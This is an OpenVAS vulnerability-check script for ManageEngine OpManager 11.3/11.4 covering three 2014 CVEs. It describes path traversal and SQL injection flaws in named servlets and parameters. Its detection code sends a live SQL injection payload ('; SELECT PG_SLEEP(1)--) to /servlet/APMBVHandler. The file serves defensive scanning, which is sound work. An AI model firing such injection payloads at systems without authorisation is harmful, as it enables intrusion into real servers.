###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_manageengine_opmanager_mult_vuln.nasl 13755 2019-02-19 10:42:02Z jschulte $
#
# ManageEngine OpManager Multiple Vulnerabilities Nov14
#
# Authors:
# Thanga Prakash S <tprakash@secpod.com>
#
# Copyright:
# Copyright (C) 2014 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:zohocorp:manageengine_opmanager";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.805103");
  script_version("$Revision: 13755 $");
  script_cve_id("CVE-2014-7866", "CVE-2014-7868", "CVE-2014-6035");
  script_bugtraq_id(71001, 71002);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2019-02-19 11:42:02 +0100 (Tue, 19 Feb 2019) $");
  script_tag(name:"creation_date", value:"2014-11-24 16:16:10 +0530 (Mon, 24 Nov 2014)");
  script_name("ManageEngine OpManager Multiple Vulnerabilities Nov14");

  script_tag(name:"summary", value:"This host is installed with ManageEngine
  OpManager and is prone to multiple vulnerabilities.");

  script_tag(name:"vuldetect", value:"Send a crafted request via HTTP GET and
  check whether it is able to execute sql query or not.");

  script_tag(name:"insight", value:"Multiple flaws are due to,

  - /servlet/MigrateLEEData script not properly sanitizing user input, specifically path traversal style attacks
  (e.g. '../') supplied via the 'fileName' parameter.

  - /servlet/MigrateCentralData script not properly sanitizing user input, specifically path traversal style attacks
  (e.g. '../') supplied via the 'zipFileName' parameter.

  - /servlet/APMBVHandler script not properly sanitizing user-supplied input to the 'OPM_BVNAME' POST parameter.

  - /servlet/DataComparisonServlet script not properly sanitizing user-supplied input to the 'query' POST
  parameter.");

  script_tag(name:"impact", value:"Successful exploitation will allow attackers to upload arbitrary files and
  execute the script within the file with the privileges of the web server, manipulate SQL queries in the backend
  database, and disclose certain sensitive information.");

  script_tag(name:"affected", value:"ManageEngine OpManager version 11.3/11.4");

  script_tag(name:"solution", value:"Apply the patches from the referenced links");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_app");

  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/35209");
  script_xref(name:"URL", value:"https://support.zoho.com/portal/manageengine/helpcenter/articles/sql-injection-vulnerability-fix");
  script_xref(name:"URL", value:"https://support.zoho.com/portal/manageengine/helpcenter/articles/fix-for-remote-code-execution-via-file-upload-vulnerability");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2014 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_manage_engine_opmanager_consolidation.nasl");
  script_mandatory_keys("manageengine/opmanager/http/detected");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

if (!port = get_app_port(cpe: CPE))
  exit(0);

data = "OPERATION_TYPE=Delete&OPM_BVNAME=aaa'; SELECT PG_SLEEP(1)--";
url = "/servlet/APMBVHandler";

req = http_post_req(port: port, url: url, data: data,
                    add_headers: make_array("Content-Type", "application/x-www-form-urlencoded"));
res = http_keepalive_send_recv(port: port, data: req);

if ("Action=BV_DELETED" >< res && "SELECT PG_SLEEP(1)--" >< res && "Result=Success" >< res &&
    "Result=Failure" >!< res) {
  security_message(port: port);
  exit(0);
}

exit(99);
